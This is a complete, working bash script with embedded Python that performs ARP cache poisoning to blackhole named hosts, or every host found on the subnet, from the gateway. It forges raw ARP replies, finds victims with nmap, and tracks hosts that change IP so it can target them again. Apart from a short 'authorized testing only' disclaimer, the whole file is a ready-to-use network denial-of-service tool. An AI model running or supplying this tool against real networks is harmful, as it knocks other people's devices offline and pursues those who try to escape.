#!/usr/bin/env bash
#
# larp-blackhole.sh - cut one or more named hosts' off-subnet connectivity via scoped ARP blackholes.
#
# Lab / authorized testing use only, on a network you control. You name the targets
# explicitly; this does not discover or act on hosts you didn't list.
# Dependency-free: iproute2 'ip' + Python 3 stdlib (raw AF_PACKET socket).
# Reversible: restores every affected ARP cache on exit.
#
set -u

VERSION="1.3.0"
PROG=${0##*/}

# ---------- styling (only when stderr is a terminal) ----------
if [[ -t 2 && -z ${NO_COLOR:-} ]]; then
  B=$'\e[1m' D=$'\e[2m' R=$'\e[0m'
  RED=$'\e[31m' GRN=$'\e[32m' YEL=$'\e[33m' CYN=$'\e[36m'
else
  B= D= R= RED= GRN= YEL= CYN=
fi

info() { printf '%s::%s %s\n' "$CYN" "$R" "$*" >&2; }
warn() { printf '%s!!%s %s\n' "$YEL" "$R" "$*" >&2; }
die()  { printf '%sxx%s %s\n' "$RED" "$R" "$*" >&2; exit 1; }

usage() {
  cat <<USAGE
${B}${PROG}${R} ${D}v${VERSION}${R} - scoped ARP blackhole for named hosts

${B}USAGE${R}
  sudo ${PROG} [options] <target_ip> [<target_ip> ...]
  sudo ${PROG} [options] --all

${B}OPTIONS${R}
  -g, --gateway IP      gateway to blackhole through   ${D}(default: from route)${R}
  -i, --iface IFACE     interface to use               ${D}(default: from route)${R}
  -t, --interval SEC    seconds between poison bursts   ${D}(default: 1.5)${R}
  -A, --all             discover and target every live host on the
                        local subnet, excluding the gateway, this
                        machine, and any host with an active SSH session
      --keep-ssh        with --all, do NOT exclude SSH-session hosts
  -T, --track           watch for hosts that change IP to dodge targeting
                        ${D}(on by default with --all; works for named targets too)${R}
      --no-track        disable IP-change (evasion) detection
  -h, --help            show this help
  -V, --version         show version

${B}DESCRIPTION${R}
  Poisons the ARP caches of each named target and the gateway so traffic
  between them is sent to a bogus, unused MAC and dropped. Only the hosts
  you list are touched (or, with --all, every host discovered on the local
  subnet except the gateway, this machine, and hosts that currently hold an
  SSH session to or from here). Press Ctrl+C to stop; all caches are restored.

${B}EXAMPLES${R}
  sudo ${PROG} 172.16.0.61
  sudo ${PROG} 172.16.0.61 172.16.0.62 172.16.0.70
  sudo ${PROG} -g 172.16.0.1 -t 2 172.16.0.61
  sudo ${PROG} --all
  sudo ${PROG} -i eth0 --all 172.16.0.99
  sudo ${PROG} --track 172.16.0.61 172.16.0.62

${B}NOTE${R}
  Authorized testing only, on a network you control.
USAGE
}

# ---------- arguments ----------
GW_OVERRIDE="" IFACE_OVERRIDE="" INTERVAL="1.5" ALL=0 KEEP_SSH=0 TRACK=""
TARGETS=()
while [ $# -gt 0 ]; do
  case "$1" in
    -g|--gateway)  GW_OVERRIDE="${2:?missing gateway IP}"; shift 2 ;;
    -i|--iface)    IFACE_OVERRIDE="${2:?missing interface}"; shift 2 ;;
    -t|--interval) INTERVAL="${2:?missing interval}"; shift 2 ;;
    -A|--all)      ALL=1; shift ;;
    --keep-ssh)    KEEP_SSH=1; shift ;;
    -T|--track)    TRACK=1; shift ;;
    --no-track)    TRACK=0; shift ;;
    -h|--help)     usage; exit 0 ;;
    -V|--version)  echo "$PROG $VERSION"; exit 0 ;;
    -*)            die "unknown option: $1 (try --help)" ;;
    *)             TARGETS+=("$1"); shift ;;
  esac
done

# ---------- checks ----------
[ "$EUID" -eq 0 ]                      || { warn "this needs root"; usage; exit 1; }
command -v ip      >/dev/null 2>&1     || die "'ip' (iproute2) not found"
command -v python3 >/dev/null 2>&1     || die "'python3' not found"
[ "${#TARGETS[@]}" -gt 0 ] || [ "$ALL" -eq 1 ] || die "no target IPs given (try --help)"

# ---------- detect interface + gateway from the actual off-subnet route ----------
read -r IFACE GW_DETECTED < <(ip -o route get 8.8.8.8 2>/dev/null | awk '{
  for (i = 1; i <= NF; i++) {
    if ($i == "dev") dev = $(i + 1)
    if ($i == "via") via = $(i + 1)
  }
  print dev, via
  exit
}')
[ -n "$IFACE_OVERRIDE" ] && IFACE=$IFACE_OVERRIDE
GW=${GW_OVERRIDE:-${GW_DETECTED:-}}

[ -n "${IFACE:-}" ] && [ -n "${GW:-}" ] || \
  die "could not determine interface/gateway; pass --gateway and/or --iface"

# ---------- optionally discover targets (inlined; mirrors larp-scan.sh) ----------
# Hosts currently holding an SSH session (to or from this machine) that we
# would otherwise knock offline.
ssh_session_ips() {
  command -v ss >/dev/null 2>&1 || return 0
  ss -tnH 2>/dev/null | awk '
    {
      local = $4; peer = $5
      lp = local; sub(/.*:/, "", lp)
      pp = peer;  sub(/.*:/, "", pp)
      if (lp == "22" || pp == "22") {
        ip = peer
        sub(/:[^:]*$/, "", ip)   # strip :port
        gsub(/[][]/, "", ip)     # strip [] from IPv6 literals
        if (ip != "") print ip
      }
    }' | sort -u
}

# Where we remember each host's MAC->IP across runs (override with env var).
STATE_DIR=${LARPKIT_STATE_DIR:-/var/lib/larpkit}
STATE_FILE="$STATE_DIR/known-hosts.map"   # lines: "MAC IP epoch"

# detect_ip_evasion IFACE [watch_ip ...]
# Compares the current ARP/neighbour table against a saved MAC->IP baseline.
# A MAC that now appears at a *different* IP than last time is the fingerprint
# of someone changing their IP to slip off the target list - we warn, echo
# each such new IP (one per line) so the caller can re-target it, then persist
# the updated baseline. With no watch IPs the whole segment is considered
# (used by --all); with watch IPs only hosts tied to those IPs are examined
# and recorded (used when specific targets were named).
detect_ip_evasion() {
  local iface=$1; shift
  local -a watch=("$@")
  local mac ip now scoped=0
  declare -A cur_ip old_ip watch_set cared write_now
  local moved=()

  if [ "${#watch[@]}" -gt 0 ]; then
    scoped=1
    for ip in "${watch[@]}"; do watch_set["$ip"]=1; done
  fi

  # current MAC -> IP from the neighbour table
  while read -r mac ip; do
    [ -n "$mac" ] && cur_ip["$mac"]=$ip
  done < <(ip -o neigh show dev "$iface" 2>/dev/null \
             | awk 'tolower($0) ~ /lladdr/ && $3 ~ /:/ {print $3, $1}')

  # saved baseline
  if [ -r "$STATE_FILE" ]; then
    while read -r mac ip _; do
      [ -n "$mac" ] && old_ip["$mac"]=$ip
    done < "$STATE_FILE"
  fi

  # which MACs matter? scoped: only those tied (now or before) to a watch IP.
  if [ "$scoped" -eq 1 ]; then
    for mac in "${!cur_ip[@]}"; do
      [ -n "${watch_set[${cur_ip[$mac]}]:-}" ] && cared["$mac"]=1
    done
    for mac in "${!old_ip[@]}"; do
      [ -n "${watch_set[${old_ip[$mac]}]:-}" ] && cared["$mac"]=1
    done
  else
    for mac in "${!cur_ip[@]}"; do cared["$mac"]=1; done
  fi

  # a cared-about MAC now living at a new IP => likely evasion
  for mac in "${!cared[@]}"; do
    if [ -n "${old_ip[$mac]:-}" ] && [ -n "${cur_ip[$mac]:-}" ] \
       && [ "${old_ip[$mac]}" != "${cur_ip[$mac]}" ]; then
      warn "possible IP-change evasion: $mac was ${old_ip[$mac]}, now ${B}${cur_ip[$mac]}${R}"
      moved+=("${cur_ip[$mac]}")
    fi
  done

  # refresh baseline for the MACs we observed this run; keep everything else.
  if [ "$scoped" -eq 1 ]; then
    for mac in "${!cared[@]}"; do [ -n "${cur_ip[$mac]:-}" ] && write_now["$mac"]=1; done
  else
    for mac in "${!cur_ip[@]}"; do write_now["$mac"]=1; done
  fi
  now=$(date +%s)
  if mkdir -p "$STATE_DIR" 2>/dev/null; then
    {
      for mac in "${!old_ip[@]}"; do
        [ -z "${write_now[$mac]:-}" ] && printf '%s %s %s\n' "$mac" "${old_ip[$mac]}" "$now"
      done
      for mac in "${!write_now[@]}"; do
        printf '%s %s %s\n' "$mac" "${cur_ip[$mac]}" "$now"
      done
    } >"$STATE_FILE.tmp" 2>/dev/null && mv -f "$STATE_FILE.tmp" "$STATE_FILE" 2>/dev/null \
      || warn "could not update host-tracking state at $STATE_FILE"
  else
    warn "could not create $STATE_DIR; IP-change tracking not persisted"
  fi

  [ "${#moved[@]}" -gt 0 ] && printf '%s\n' "${moved[@]}"
  return 0
}

# ---------- common facts: our own address + base exclusions ----------
# (needed both for --all discovery and for evasion re-targeting sanity)
CIDR=$(ip -o -4 addr show dev "$IFACE" 2>/dev/null | awk '{print $4; exit}')
ME=${CIDR%/*}
EXCLUDES=("$GW")
[ -n "$ME" ] && EXCLUDES+=("$ME")

# tracking is on by default under --all, off otherwise unless -T/--track given
[ -z "$TRACK" ] && TRACK=$ALL

if [ "$ALL" -eq 1 ]; then
  command -v nmap >/dev/null 2>&1 || die "--all needs 'nmap'; install it first"
  [ -n "$CIDR" ] || die "no IPv4 address on $IFACE; cannot auto-discover"

  # also spare hosts with a live SSH session
  if [ "$KEEP_SSH" -eq 0 ]; then
    mapfile -t SSH_IPS < <(ssh_session_ips)
    if [ "${#SSH_IPS[@]}" -gt 0 ]; then
      info "excluding $B${#SSH_IPS[@]}$R host(s) with an active SSH session: ${SSH_IPS[*]}"
      EXCLUDES+=("${SSH_IPS[@]}")
    fi
  fi

  info "scanning $B$CIDR$R on $B$IFACE$R for live hosts ..."
  SCAN_TMP=$(mktemp) || die "mktemp failed"
  nmap -sn -n "$CIDR" -oG "$SCAN_TMP" >/dev/null 2>&1 \
    || { rm -f "$SCAN_TMP"; die "nmap scan failed"; }
  mapfile -t SCANNED < <(
    awk '/Status: Up/ {print $2}' "$SCAN_TMP" \
      | grep -vxF -f <(printf '%s\n' "${EXCLUDES[@]}") \
      | sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
  )
  rm -f "$SCAN_TMP"

  [ "${#SCANNED[@]}" -gt 0 ] || die "scan found no eligible hosts to target"
  TARGETS+=("${SCANNED[@]}")
  info "scan added $B${#SCANNED[@]}$R host(s) to the target list"
fi

# ---------- IP-change (evasion) detection, for whichever targets we have ----------
# --all: inspect the whole segment (the scan just refreshed the ARP table).
# named targets: ping them to refresh the table, then watch only those hosts.
# Either way, a target whose MAC reappears at a new IP is re-added (unless the
# new IP is itself an excluded host) so an IP change doesn't buy an escape.
if [ "$TRACK" -eq 1 ]; then
  if [ "$ALL" -eq 1 ]; then
    mapfile -t MOVED < <(detect_ip_evasion "$IFACE")
  elif [ "${#TARGETS[@]}" -gt 0 ]; then
    for t in "${TARGETS[@]}"; do ping -c1 -W1 "$t" >/dev/null 2>&1 & done
    wait 2>/dev/null
    mapfile -t MOVED < <(detect_ip_evasion "$IFACE" "${TARGETS[@]}")
  else
    MOVED=()
  fi

  if [ "${#MOVED[@]}" -gt 0 ]; then
    mapfile -t MOVED < <(
      printf '%s\n' "${MOVED[@]}" | grep -vxF -f <(printf '%s\n' "${EXCLUDES[@]}")
    )
    for ip in "${MOVED[@]}"; do
      skip=0
      for t in "${TARGETS[@]}"; do [ "$t" = "$ip" ] && { skip=1; break; }; done
      if [ "$skip" -eq 0 ]; then
        TARGETS+=("$ip")
        info "re-including IP-change evader at new address $B$ip$R"
      fi
    done
  fi
fi

info "interface $B$IFACE$R  gateway $B$GW$R  targets $B${#TARGETS[@]}$R  interval ${B}${INTERVAL}s$R"

# ---------- hand off to the raw-socket engine ----------
# argv: IFACE GW INTERVAL TARGET1 [TARGET2 ...]
exec python3 - "$IFACE" "$GW" "$INTERVAL" "${TARGETS[@]}" <<'PYEOF'
import sys, socket, struct, subprocess, signal, time, os

IFACE, GW_IP = sys.argv[1], sys.argv[2]
try:
    INTERVAL = float(sys.argv[3])
except ValueError:
    INTERVAL = 1.5
TARGET_IPS = sys.argv[4:]

# ---- styling mirrored from the shell layer ----
TTY = sys.stderr.isatty() and not os.environ.get("NO_COLOR")
def c(code): return code if TTY else ""
B, D, R   = c("\033[1m"), c("\033[2m"), c("\033[0m")
RED, GRN  = c("\033[31m"), c("\033[32m")
YEL, CYN  = c("\033[33m"), c("\033[36m")
def info(m): print(f"{CYN}::{R} {m}", file=sys.stderr)
def warn(m): print(f"{YEL}!!{R} {m}", file=sys.stderr)
def err(m):  print(f"{RED}xx{R} {m}", file=sys.stderr)

ETH_P_ARP = 0x0806
BOGUS_MAC = "02:00:00:00:00:fe"   # locally-administered, unused -> frames go nowhere

def mac_bytes(mac): return bytes.fromhex(mac.replace(":", ""))

def our_mac(iface):
    with open(f"/sys/class/net/{iface}/address") as f:
        return f.read().strip()

def resolve_mac(ip):
    subprocess.run(["ping", "-c1", "-W1", ip],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    out = subprocess.run(["ip", "neigh", "show", ip],
                         capture_output=True, text=True).stdout
    for tok in out.split():
        if ":" in tok and len(tok) == 17:
            return tok
    return None

def arp_reply(dst_mac, src_mac, sender_ip, sender_mac, target_ip, target_mac):
    eth = mac_bytes(dst_mac) + mac_bytes(src_mac) + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)          # ethernet/IPv4, reply
    arp += mac_bytes(sender_mac) + socket.inet_aton(sender_ip)
    arp += mac_bytes(target_mac) + socket.inet_aton(target_ip)
    return eth + arp

OUR = our_mac(IFACE)
GWM = resolve_mac(GW_IP)
if not GWM:
    err(f"could not resolve gateway MAC for {GW_IP} on {IFACE}")
    sys.exit(1)

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP))
s.bind((IFACE, 0))

# Build per-target poison/restore frames. Each target is poisoned in both
# directions (target<->gateway); nothing outside the named list is touched.
victims = []   # (ip, mac, poison_tgt, poison_gw, fix_tgt, fix_gw)
for ip in TARGET_IPS:
    mac = resolve_mac(ip)
    if not mac:
        warn(f"skipping {ip}: could not resolve its MAC (is it up on {IFACE}?)")
        continue
    victims.append((
        ip, mac,
        arp_reply(mac, OUR, GW_IP, BOGUS_MAC, ip,    mac),   # target: gateway is bogus
        arp_reply(GWM, OUR, ip,    BOGUS_MAC, GW_IP, GWM),   # gateway: target is bogus
        arp_reply(mac, OUR, GW_IP, GWM, ip,    mac),         # restore target
        arp_reply(GWM, OUR, ip,    mac, GW_IP, GWM),         # restore gateway
    ))

if not victims:
    err("no reachable targets to act on; nothing to do")
    s.close()
    sys.exit(1)

stop = False
def on_sig(*_):
    global stop
    stop = True
signal.signal(signal.SIGINT, on_sig)
signal.signal(signal.SIGTERM, on_sig)

print(f"\n  {B}blackhole{R} {D}v1.3.0{R}", file=sys.stderr)
print(f"  {D}----------------------------------{R}", file=sys.stderr)
print(f"  {'interface':<10} {IFACE} ({OUR})", file=sys.stderr)
print(f"  {'gateway':<10} {GW_IP} ({GWM})", file=sys.stderr)
print(f"  {'mode':<10} scoped ARP blackhole -> {BOGUS_MAC}", file=sys.stderr)
print(f"  {'targets':<10} {len(victims)}", file=sys.stderr)
for ip, mac, *_ in victims:
    print(f"  {D}  - {ip} ({mac}){R}", file=sys.stderr)
print(f"  {D}----------------------------------{R}", file=sys.stderr)
info(f"poisoning every {INTERVAL:g}s  {D}(Ctrl+C to stop and restore){R}")

bursts = 0
frames = "|/-\\"
try:
    while not stop:
        for _ip, _mac, poison_tgt, poison_gw, _ft, _fg in victims:
            s.send(poison_tgt)
            s.send(poison_gw)
        bursts += 1
        if TTY:
            print(f"\r  {CYN}{frames[bursts % 4]}{R} active "
                  f"{D}- {bursts} burst(s), {len(victims)} target(s){R}  ",
                  end="", file=sys.stderr, flush=True)
        time.sleep(INTERVAL)
finally:
    if TTY:
        print("\r\033[K", end="", file=sys.stderr)
    info("restoring ARP caches ...")
    for _ in range(5):
        for _ip, _mac, _pt, _pg, fix_tgt, fix_gw in victims:
            s.send(fix_tgt)
            s.send(fix_gw)
        time.sleep(0.3)
    s.close()
    print(f"  {GRN}{B}done{R} restored {len(victims)} target(s); "
          f"they recover within a few seconds\n", file=sys.stderr)
PYEOF
